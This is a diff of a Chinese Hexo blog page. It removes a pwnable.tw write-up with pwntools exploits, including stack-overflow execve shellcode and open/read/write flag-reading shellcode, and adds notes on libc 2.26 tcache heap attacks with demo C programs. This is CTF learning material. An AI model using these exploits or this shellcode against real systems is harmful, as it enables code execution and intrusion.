@@ -19,27 +19,22 @@
         <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
     
     <meta name="description" content="">
-    <meta name="description" content="一、start首先进行保护检查，保护全关  然后用IDA分析一下： 123456789101112131415161718192021222324252627282930313233343536text:08048060 ; __int64 start().text:08048060                 public _start.text:08048060 _start">
+    <meta name="description" content="fastbin attackfastbin dup在libc-2.26，对应 tcache dup由于新添加的tcache机制不会检查 二次释放，因此不必考虑如何绕过的问题，直接释放两次即可，fastbin dup变得更加简单，甚至还不局限于fastbin大小的chunk，我们称之为tcache dup。示例程序： 123456789101112#include &lt;stdlib.h&gt;#">
 <meta property="og:type" content="article">
-<meta property="og:title" content="pwnable刷题">
-<meta property="og:url" content="http://example.com/2022/01/08/pwnable%E5%88%B7%E9%A2%98/index.html">
+<meta property="og:title" content="libc 2.26">
+<meta property="og:url" content="http://example.com/2022/04/07/libc-2.26/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="一、start首先进行保护检查，保护全关  然后用IDA分析一下： 123456789101112131415161718192021222324252627282930313233343536text:08048060 ; __int64 start().text:08048060                 public _start.text:08048060 _start">
+<meta property="og:description" content="fastbin attackfastbin dup在libc-2.26，对应 tcache dup由于新添加的tcache机制不会检查 二次释放，因此不必考虑如何绕过的问题，直接释放两次即可，fastbin dup变得更加简单，甚至还不局限于fastbin大小的chunk，我们称之为tcache dup。示例程序： 123456789101112#include &lt;stdlib.h&gt;#">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202201092034411.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202201092034412.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202201092034413.png">
-<meta property="article:published_time" content="2022-01-07T16:13:03.339Z">
-<meta property="article:modified_time" content="2022-01-09T12:34:31.245Z">
+<meta property="article:published_time" content="2022-04-07T13:17:49.108Z">
+<meta property="article:modified_time" content="2022-04-07T13:18:15.767Z">
 <meta property="article:author" content="John Doe">
-<meta property="article:tag" content="pwn">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202201092034411.png">
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
     <link rel="icon" href="/assets/favicon.ico">
     
-    <title>pwnable刷题 · 渐渐的博客</title>
+    <title>libc 2.26 · 渐渐的博客</title>
     <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
 /* This file is meant as a standalone workflow for
 - testing support for link[rel=preload]
@@ -264,7 +259,7 @@
                 <a href="/">渐渐的博客</a>
             </div>
             <div class="post-title header-element">
-                <a href="#" class="post-name">pwnable刷题</a>
+                <a href="#" class="post-name">libc 2.26</a>
             </div>
         </div>
     
@@ -310,7 +305,7 @@
         <h1 class="intro-title">
             <!-- 主页  -->
             
-                pwnable刷题
+                libc 2.26
             <!-- 404 -->
             
         </h1>
@@ -327,23 +322,15 @@
             <div class="post-intros">
                 <!-- 文章页标签  -->
                 
-                    <div class= post-intro-tags >
-    
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="pwn">pwn</a>
-    
-</div>
-
-                
                 
                     <div class="post-intro-read">
-                        <span>Word count: <span class="post-count word-count">795</span>Reading time: <span class="post-count reading-time">4 min</span></span>
+                        <span>Word count: <span class="post-count word-count">619</span>Reading time: <span class="post-count reading-time">2 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
                     <!-- 撰写日期 -->
                     <span class="iconfont-archer post-intro-calander">&#xe676;</span>
-                    <span class="post-intro-time">2022/01/08</span>
+                    <span class="post-intro-time">2022/04/07</span>
                     <!-- busuanzi -->
                     
                         <span id="busuanzi_container_page_pv" class="busuanzi-pv">
@@ -498,115 +485,18 @@
             <div class="container container-unloaded">
                 <main class="main post-page">
     <article class="article-entry">
-        <h2 id="一、start"><a href="#一、start" class="headerlink" title="一、start"></a>一、start</h2><p>首先进行保护检查，保护全关</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202201092034411.png" alt="image-20211113211951506"></p>
-<p>然后用IDA分析一下：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">text:<span class="number">08048060</span> ; <span class="function">__int64 <span class="title">start</span><span class="params">()</span></span></span><br><span class="line"><span class="function">.text:08048060                 <span class="keyword">public</span> _start</span></span><br><span class="line"><span class="function">.text:08048060 _start          proc near               </span>; DATA XREF: LOAD:<span class="number">08048018</span>↑o</span><br><span class="line">.text:<span class="number">08048060</span>                 push    esp</span><br><span class="line">.text:<span class="number">08048061</span>                 push    offset _exit</span><br><span class="line">.text:<span class="number">08048066</span>                 <span class="keyword">xor</span>     eax, eax</span><br><span class="line">.text:<span class="number">08048068</span>                 <span class="keyword">xor</span>     ebx, ebx</span><br><span class="line">.text:<span class="number">0804806</span>A                 <span class="keyword">xor</span>     ecx, ecx</span><br><span class="line">.text:<span class="number">0804806</span>C                 <span class="keyword">xor</span>     edx, edx</span><br><span class="line">.text:<span class="number">0804806</span>E</span><br><span class="line">.text:<span class="number">0804806</span>E _FTC:</span><br><span class="line">.text:<span class="number">0804806</span>E                 push    <span class="number">3</span>A465443h</span><br><span class="line">.text:<span class="number">08048073</span></span><br><span class="line">.text:<span class="number">08048073</span> eht:</span><br><span class="line">.text:<span class="number">08048073</span>                 push    <span class="number">20656874</span>h</span><br><span class="line">.text:<span class="number">08048078</span></span><br><span class="line">.text:<span class="number">08048078</span> tra:</span><br><span class="line">.text:<span class="number">08048078</span>                 push    <span class="number">20747261</span>h</span><br><span class="line">.text:<span class="number">0804807</span>D</span><br><span class="line">.text:<span class="number">0804807</span>D ts s:</span><br><span class="line">.text:<span class="number">0804807</span>D                 push    <span class="number">74732073</span>h</span><br><span class="line">.text:<span class="number">08048082</span></span><br><span class="line">.text:<span class="number">08048082</span> <span class="string">&#x27;teL:</span></span><br><span class="line"><span class="string">.text:08048082                 push    2774654Ch</span></span><br><span class="line"><span class="string">.text:08048087                 mov     ecx, esp        ; addr</span></span><br><span class="line"><span class="string">.text:08048089                 mov     dl, 14h         ; len</span></span><br><span class="line"><span class="string">.text:0804808B                 mov     bl, 1           ; fd</span></span><br><span class="line"><span class="string">.text:0804808D                 mov     al, 4</span></span><br><span class="line"><span class="string">.text:0804808F                 int     80h             ; LINUX - sys_write</span></span><br><span class="line"><span class="string">.text:08048091                 xor     ebx, ebx</span></span><br><span class="line"><span class="string">.text:08048093                 mov     dl, 3Ch ; &#x27;</span>&lt;&#x27;</span><br><span class="line">.text:<span class="number">08048095</span>                 mov     al, <span class="number">3</span></span><br><span class="line">.text:<span class="number">08048097</span>                 <span class="keyword">int</span>     <span class="number">80</span>h             ; LINUX -</span><br><span class="line">.text:<span class="number">08048099</span>                 add     esp, <span class="number">14</span>h</span><br><span class="line">.text:<span class="number">0804809</span>C                 retn</span><br><span class="line">.text:<span class="number">0804809</span>C _start          endp ; sp-analysis failed</span><br></pre></td></tr></table></figure>
+        <h3 id="fastbin-attack"><a href="#fastbin-attack" class="headerlink" title="fastbin attack"></a>fastbin attack</h3><h4 id="fastbin-dup"><a href="#fastbin-dup" class="headerlink" title="fastbin dup"></a>fastbin dup</h4><p>在libc-2.26，对应 tcache dup由于新添加的tcache机制不会检查 二次释放，因此不必考虑如何绕过的问题，直接释放两次即可，fastbin dup变得更加简单，甚至还不局限于fastbin大小的chunk，我们称之为tcache dup。示例程序：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;1st malloc(0x10): %p\n&quot;</span>, p1);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;free the chunk twice\n&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(p1);</span><br><span class="line">    <span class="built_in">free</span>(p1);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;2nd malloc(0x10): %p\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">0x10</span>));</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;3rd malloc(0x10): %p\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">0x10</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p>采用了两个系统调用，其具体功能如下：</p>
-<table>
-<thead>
-<tr>
-<th>%rax</th>
-<th>System call</th>
-<th>%rdi</th>
-<th>%rsi</th>
-<th>%rdx</th>
-<th>%r10</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>3</td>
-<td>sys_read</td>
-<td>unsigned int fd</td>
-<td>char *buf</td>
-<td>size_t count</td>
-<td></td>
-</tr>
-<tr>
-<td>4</td>
-<td>sys_write</td>
-<td>unsigned int fd</td>
-<td>const char *buf</td>
-<td>size_t count</td>
-<td></td>
-</tr>
-</tbody></table>
-<p>dl这个寄存器是控制输入字符的多少的，也就是所我们可以输入0x3c个字符，即read(1,esp,0x3c)</p>
-<p>程序的基本功能为：</p>
-<ul>
-<li>exit 压栈</li>
-<li>write 字符串 “Let’s start the CTF:”</li>
-<li>向 esp 位置read  0x3c 大小的串</li>
-</ul>
-<p>程序保护全关，我们可以试试shellcode，那么我们就必须要知道栈的地址</p>
-<p>可以看到ret返回时esp和exit的距离为0x14，则我们只需溢出0x14字节，20字节后覆盖ret，24字节后覆盖esp。</p>
-<p>则我们可以利用<code>.text:08048087                 mov     ecx, esp        ; addr</code>将esp的地址打印出来</p>
-<p>此外注意返回时ret_addr=esp+0x14</p>
-<p>则最后的exp为：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=remote(<span class="string">&quot;chall.pwnable.tw&quot;</span>,<span class="number">10000</span>)</span><br><span class="line"><span class="comment">#p=process(&#x27;./start&#x27;)</span></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x14</span>+p32(<span class="number">0x08048087</span>)</span><br><span class="line">p.sendafter(<span class="string">&quot;Let&#x27;s start the CTF:&quot;</span>,payload)</span><br><span class="line">esp_addr=u32(p.recv(<span class="number">4</span>))</span><br><span class="line">shellcode=<span class="string">&quot;\x99\xf7\xe2\x8d\x08\xbe\x2f\x2f\x73\x68\xbf\x2f\x62\x69\x6e\x51\x56\x57\x8d\x1c\x24\xb0\x0b\xcd\x80&quot;</span></span><br><span class="line">payload1=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x14</span>+p32(esp_addr+<span class="number">0x14</span>)+shellcode</span><br><span class="line">p.send(payload1)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h4 id="fastbin-dup-into-stack"><a href="#fastbin-dup-into-stack" class="headerlink" title="fastbin dup into stack"></a>fastbin dup into stack</h4><p>对应tcache dup into stack 攻 击 ， 或 者 称 为 tcache poisoning 。 其方法是修改tcache bin 中 chunk 的 fd 指 针 为 目 标 位 置 ， 也 就 是 改 变tcache_entry的next指针，在调用malloc()时即可在目标位置得到chunk。对此，tcache_get()函数没有做任何的检查</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">int64_t</span> *p1, *p2, *p3, target[<span class="number">10</span>];</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;target stack: %p\n&quot;</span>, target);</span><br><span class="line">	p1 = <span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;p1 malloc(0x30): %p\n&quot;</span>, p1);</span><br><span class="line">	<span class="built_in">free</span>(p1);</span><br><span class="line">	*p1 = (<span class="keyword">int64_t</span>)target;</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;free(p1) and overwrite the next ptr\n&quot;</span>);</span><br><span class="line">	p2 = <span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line">	p3 = <span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;p2 malloc(0x30): %p\np3 malloc(0x30): %p\n&quot;</span>, p2, p3);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<h2 id="二、orw"><a href="#二、orw" class="headerlink" title="二、orw"></a>二、orw</h2><p>题目信息：</p>
-<blockquote>
-<p>Read the flag from <code>/home/orw/flag</code>.</p>
-<p>Only <code>open</code> <code>read</code> <code>write</code> syscall are allowed to use.</p>
-</blockquote>
-<p>先进行保护检查：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202201092034412.png" alt="image-20211114151705729"></p>
-<p>IDA分析</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  orw_seccomp();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Give my your shellcode:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;shellcode, <span class="number">0xC8</span>u);</span><br><span class="line">  ((<span class="keyword">void</span> (*)(<span class="keyword">void</span>))shellcode)();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">orw_seccomp</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int16 v1; <span class="comment">// [esp+4h] [ebp-84h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> *v2; <span class="comment">// [esp+8h] [ebp-80h]</span></span><br><span class="line">  <span class="keyword">char</span> v3[<span class="number">96</span>]; <span class="comment">// [esp+Ch] [ebp-7Ch] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v4; <span class="comment">// [esp+6Ch] [ebp-1Ch]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  qmemcpy(v3, &amp;unk_8048640, <span class="keyword">sizeof</span>(v3));</span><br><span class="line">  v1 = <span class="number">12</span>;</span><br><span class="line">  v2 = v3;</span><br><span class="line">  prctl(<span class="number">38</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  prctl(<span class="number">22</span>, <span class="number">2</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>int <strong>prctl</strong> ( int <strong>option</strong>,unsigned long arg2,unsigned long arg3,unsigned long arg4,unsigned long arg5 )</p>
-<p>这个系统调用指令是为进程制定而设计的</p>
-</blockquote>
-<p>我们可以通过seccomp-tools这个工具看看它限制了哪些系统调⽤</p>
-<p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202201092034413.png" alt="image-20211114152700989"></p>
-<p>如题目描述一样，只能执行open、read、write三种函数，则我们可以利用以上三个函数将flag打印出来。</p>
-<p>这三个函数的系统调用如下：</p>
-<table>
-<thead>
-<tr>
-<th>%rax</th>
-<th>System call</th>
-<th>eax</th>
-<th>ebx</th>
-<th>ecx</th>
-<th>edx</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>3</td>
-<td>sys_read</td>
-<td>unsigned int fd</td>
-<td>char *buf</td>
-<td>size_t count</td>
-<td></td>
-</tr>
-<tr>
-<td>4</td>
-<td>sys_write</td>
-<td>unsigned int fd</td>
-<td>const char *buf</td>
-<td>size_t count</td>
-<td></td>
-</tr>
-<tr>
-<td>5</td>
-<td>sys_open</td>
-<td>const char __user *filename</td>
-<td>int flagsumode_t mode</td>
-<td>umode_t mode</td>
-<td></td>
-</tr>
-</tbody></table>
-<p>exp为：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./orw&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;chall.pwnable.tw&#x27;</span>,<span class="number">10001</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Give my your shellcode:&#x27;</span>)</span><br><span class="line"><span class="comment">#open</span></span><br><span class="line">shellcode = shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;/home/orw/flag&#x27;</span>)</span><br><span class="line"><span class="comment">#read</span></span><br><span class="line">shellcode += shellcraft.read(<span class="number">3</span>,<span class="string">&#x27;esp&#x27;</span>,<span class="number">0x40</span>)</span><br><span class="line"><span class="comment">#write</span></span><br><span class="line">shellcode += shellcraft.write(<span class="number">1</span>,<span class="string">&#x27;esp&#x27;</span>,<span class="number">0x40</span>)</span><br><span class="line">shellcode=asm(shellcode)</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-
-
+<h4 id="house-of-spirit"><a href="#house-of-spirit" class="headerlink" title="house of spirit"></a>house of spirit</h4><p>该技术在libc-2.26中同样适用，且使用范围更广也更简单。由于tcache在释放堆块时没有对其前后堆块进行合法性校验，因此只需本 块对齐（2*SIZE_SZ）就可以将堆块释放到tcache，而在申请时，tcache对内部大小合适的堆块也是直接分配的，这使得该技术可以直</p>
+<p>接延伸到small bin</p>
+<h3 id="off-by-one"><a href="#off-by-one" class="headerlink" title="off-by-one"></a>off-by-one</h3><h4 id="poison-by-one"><a href="#poison-by-one" class="headerlink" title="poison-by-one"></a>poison-by-one</h4><p>libc-2.26 中 新 增 了 unlink 对 chunk_size==next-&gt;prev-&gt;chunk_size的检查，以对抗单字节溢出，同时，Ubuntu16.04的libc-2.23也打了相应的补丁，所以我们需要修改chunk b的下一个堆块，</p>
+<h3 id="house-of-force"><a href="#house-of-force" class="headerlink" title="house of force"></a>house of force</h3><p>然后请求一块大小为0xffffffffffd13fe0的空间， 这个大小的计算公式是用目标地址减去top chunk地址，再减去两个chunk头的大小0x10*2。</p>
+<p>house-of-force的缺点是需要泄露堆地址，如果攻击者想 要通过该技术控制指定内存区域，首先就需要知道top chunk的位置，以构造合适的请求来获得对应内存，因此会受到ASLR的影响。</p>
+<p>libc-2.29在_int_malloc()函数中新增了一段对top chunk大小 的检查，除非我们能够修改av-&gt;system_mem，否则house-of-force就失效了</p>
 
     </article>
     <!-- license -->
@@ -615,17 +505,12 @@
     <ul class="post-paginator">
         <li class="next">
             
-                <div class="nextSlogan">Next Post</div>
-                <a href="/2022/01/08/secretHolder_hitcon_2016/" title="secretHolder_hitcon_2016">
-                    <div class="nextTitle">secretHolder_hitcon_2016</div>
-                </a>
-            
         </li>
         <li class="previous">
             
                 <div class="prevSlogan">Previous Post</div>
-                <a href="/2022/01/08/off-by-one/" title="off-by-one">
-                    <div class="prevTitle">off-by-one</div>
+                <a href="/2022/04/07/house-of-storm/" title="house of storm">
+                    <div class="prevTitle">house of storm</div>
                 </a>
             
         </li>
@@ -756,7 +641,7 @@
                 <div class="toc-catalog">
                     <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
                 </div>
-                <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81start"><span class="toc-number">1.</span> <span class="toc-text">一、start</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81orw"><span class="toc-number">2.</span> <span class="toc-text">二、orw</span></a></li></ol>
+                <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#fastbin-attack"><span class="toc-number">1.</span> <span class="toc-text">fastbin attack</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#fastbin-dup"><span class="toc-number">1.1.</span> <span class="toc-text">fastbin dup</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#fastbin-dup-into-stack"><span class="toc-number">1.2.</span> <span class="toc-text">fastbin dup into stack</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#house-of-spirit"><span class="toc-number">1.3.</span> <span class="toc-text">house of spirit</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#off-by-one"><span class="toc-number">2.</span> <span class="toc-text">off-by-one</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#poison-by-one"><span class="toc-number">2.1.</span> <span class="toc-text">poison-by-one</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#house-of-force"><span class="toc-number">3.</span> <span class="toc-text">house of force</span></a></li></ol>
             </div>
         
         <!-- sidebar -->
